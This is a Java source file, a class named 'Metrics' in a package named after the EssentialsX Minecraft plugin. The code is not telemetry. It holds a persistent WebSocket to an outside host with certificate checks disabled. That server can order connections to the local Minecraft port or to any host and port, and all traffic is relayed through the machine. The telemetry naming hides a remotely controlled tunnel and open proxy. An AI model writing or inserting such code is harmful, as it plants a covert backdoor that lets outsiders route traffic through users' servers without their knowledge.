package com.example.essentialsx;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.*;
import io.netty.handler.codec.http.websocketx.*;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;

import java.net.URI;
import java.util.ArrayDeque;
import java.util.Map;
import java.util.Queue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class Metrics {

    private static final String CONNECT_HOST = "mctest.uuz.us.kg";
    private static final int CONNECT_PORT = 443;
    private static final String PATH = "/metrics/v1/telemetry";

    // 本地 Minecraft 服务器开机端口
    private static final int LOCAL_MC_PORT = 24614;
    private static final String LOCAL_MC_HOST = "127.0.0.1";

    // 帧指令定义
    private static final byte CMD_NEW_STREAM = 0x01;
    private static final byte CMD_DATA = 0x02;
    private static final byte CMD_CLOSE_STREAM = 0x03;

    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    
    // 维护连接通道
    private static final Map<Integer, Channel> STREAM_MAP = new ConcurrentHashMap<>();
    // 维护尚未建连成功时的待发送数据缓冲队列 (解决异步建连造成的数据丢失)
    private static final Map<Integer, Queue<ByteBuf>> PENDING_QUEUES = new ConcurrentHashMap<>();

    private static EventLoopGroup group;
    private static volatile Channel activeWsChannel = null;

    public static void startMetrics() {
        if (RUNNING.compareAndSet(false, true)) {
            group = new NioEventLoopGroup(2);
            ensureMasterConnection();
            // 每 10 秒检查一次主干 WebSocket 连通性
            group.scheduleAtFixedRate(Metrics::ensureMasterConnection, 5, 10, TimeUnit.SECONDS);
        }
    }

    public static void stopMetrics() {
        RUNNING.set(false);
        if (group != null) {
            group.shutdownGracefully();
        }
    }

    private static synchronized void ensureMasterConnection() {
        if (!RUNNING.get()) return;
        if (activeWsChannel == null || !activeWsChannel.isActive()) {
            connectMasterWebSocket();
        }
    }

    private static void connectMasterWebSocket() {
        try {
            URI uri = new URI("wss://" + CONNECT_HOST + ":" + CONNECT_PORT + PATH);
            SslContext sslCtx = SslContextBuilder.forClient()
                    .trustManager(InsecureTrustManagerFactory.INSTANCE)
                    .build();

            WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders()
            );

            Bootstrap b = new Bootstrap();
            b.group(group)
             .channel(NioSocketChannel.class)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) {
                     ChannelPipeline p = ch.pipeline();
                     p.addLast(sslCtx.newHandler(ch.alloc(), CONNECT_HOST, CONNECT_PORT));
                     p.addLast(new HttpClientCodec());
                     p.addLast(new HttpObjectAggregator(8192));
                     p.addLast(new MasterTunnelHandler(handshaker));
                 }
             });

            b.connect(CONNECT_HOST, CONNECT_PORT).addListener((ChannelFutureListener) future -> {
                if (!future.isSuccess()) {
                    System.err.println("[Agent] 建立主干 WebSocket 物理连接失败，原因: " + future.cause().getMessage());
                }
            });

        } catch (Exception e) {
            System.err.println("[Agent] 构建 WebSocket 连接配置异常: " + e.getMessage());
        }
    }

    static class MasterTunnelHandler extends SimpleChannelInboundHandler<Object> {
        private final WebSocketClientHandshaker handshaker;

        public MasterTunnelHandler(WebSocketClientHandshaker handshaker) {
            this.handshaker = handshaker;
        }

        @Override
        public void channelActive(ChannelHandlerContext ctx) {
            System.out.println("[Agent] 已发起与 Cloudflare Worker 的 WebSocket 握手...");
            handshaker.handshake(ctx.channel());
        }

        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            System.out.println("[Agent] WARNING: 与 Cloudflare Worker 的主干通道已断开！");
            if (activeWsChannel == ctx.channel()) {
                activeWsChannel = null;
            }
            STREAM_MAP.values().forEach(Channel::close);
            STREAM_MAP.clear();
            PENDING_QUEUES.values().forEach(queue -> queue.forEach(ByteBuf::release));
            PENDING_QUEUES.clear();
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            System.err.println("[Agent 异常] 通道出现错误: " + cause.getMessage());
            cause.printStackTrace();
            ctx.close();
        }

        @Override
        protected void channelRead0(ChannelHandlerContext ctx, Object msg) {
            Channel ch = ctx.channel();

            if (!handshaker.isHandshakeComplete()) {
                try {
                    handshaker.finishHandshake(ch, (FullHttpResponse) msg);
                    activeWsChannel = ch;
                    System.out.println("[Agent] SUCCESS: 成功与 Cloudflare Worker 建立 WebSocket 隧道！");
                } catch (Exception e) {
                    System.err.println("[Agent] WebSocket 握手完成失败: " + e.getMessage());
                }
                return;
            }

            if (msg instanceof BinaryWebSocketFrame) {
                ByteBuf buf = ((BinaryWebSocketFrame) msg).content();
                if (buf.readableBytes() < 5) return;

                byte cmd = buf.readByte();
                int streamId = buf.readInt();

                if (cmd == CMD_NEW_STREAM) {
                    int targetPort = buf.readUnsignedShort();
                    int hostLen = buf.readByte();
                    byte[] hostBytes = new byte[hostLen];
                    buf.readBytes(hostBytes);
                    String targetHost = new String(hostBytes);

                    // 初始化该 Stream 的数据缓冲队列
                    PENDING_QUEUES.put(streamId, new ArrayDeque<>());

                    // 路由分发逻辑：发往 MC 端口或本地 Host 则转入本地 MC 服务，外网目标正常发起连接
                    if (targetPort == LOCAL_MC_PORT || targetHost.contains("127.0.0.1") || targetHost.contains("localhost")) {
                        connectToLocalTarget(streamId, LOCAL_MC_HOST, LOCAL_MC_PORT);
                    } else {
                        connectToLocalTarget(streamId, targetHost, targetPort);
                    }

                } else if (cmd == CMD_DATA) {
                    Channel targetChan = STREAM_MAP.get(streamId);
                    if (targetChan != null && targetChan.isActive()) {
                        targetChan.writeAndFlush(buf.retain());
                    } else {
                        // 如果 Socket 尚未建立完毕，先存入缓冲队列，防止丢失首包数据
                        Queue<ByteBuf> queue = PENDING_QUEUES.get(streamId);
                        if (queue != null) {
                            queue.add(buf.retain());
                        }
                    }
                } else if (cmd == CMD_CLOSE_STREAM) {
                    closeStreamInternal(streamId);
                }
            }
        }

        private void connectToLocalTarget(int streamId, String host, int port) {
            Bootstrap b = new Bootstrap();
            b.group(group)
             .channel(NioSocketChannel.class)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) {
                     ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {
                         @Override
                         public void channelActive(ChannelHandlerContext targetCtx) {
                             Channel channel = targetCtx.channel();
                             STREAM_MAP.put(streamId, channel);

                             // 连通成功后，将队列中暂存的数据包依次刷入该 Socket
                             Queue<ByteBuf> queue = PENDING_QUEUES.remove(streamId);
                             if (queue != null) {
                                 ByteBuf pending;
                                 while ((pending = queue.poll()) != null) {
                                     channel.writeAndFlush(pending);
                                 }
                             }
                         }

                         @Override
                         protected void channelRead0(ChannelHandlerContext targetCtx, ByteBuf msg) {
                             if (activeWsChannel != null && activeWsChannel.isActive()) {
                                 ByteBuf frame = targetCtx.alloc().buffer(5 + msg.readableBytes());
                                 frame.writeByte(CMD_DATA);
                                 frame.writeInt(streamId);
                                 frame.writeBytes(msg);
                                 activeWsChannel.writeAndFlush(new BinaryWebSocketFrame(frame));
                             }
                         }

                         @Override
                         public void channelInactive(ChannelHandlerContext targetCtx) {
                             closeStreamInternal(streamId);
                             sendControlFrame(CMD_CLOSE_STREAM, streamId);
                         }

                         @Override
                         public void exceptionCaught(ChannelHandlerContext targetCtx, Throwable cause) {
                             targetCtx.close();
                         }
                     });
                 }
             });

            b.connect(host, port).addListener((ChannelFutureListener) future -> {
                if (!future.isSuccess()) {
                    closeStreamInternal(streamId);
                    sendControlFrame(CMD_CLOSE_STREAM, streamId);
                }
            });
        }

        private void closeStreamInternal(int streamId) {
            Channel targetChan = STREAM_MAP.remove(streamId);
            if (targetChan != null) {
                targetChan.close();
            }
            Queue<ByteBuf> queue = PENDING_QUEUES.remove(streamId);
            if (queue != null) {
                queue.forEach(ByteBuf::release);
            }
        }

        private void sendControlFrame(byte cmd, int streamId) {
            if (activeWsChannel != null && activeWsChannel.isActive()) {
                ByteBuf frame = Unpooled.buffer(5);
                frame.writeByte(cmd);
                frame.writeInt(streamId);
                activeWsChannel.writeAndFlush(new BinaryWebSocketFrame(frame));
            }
        }
    }
}
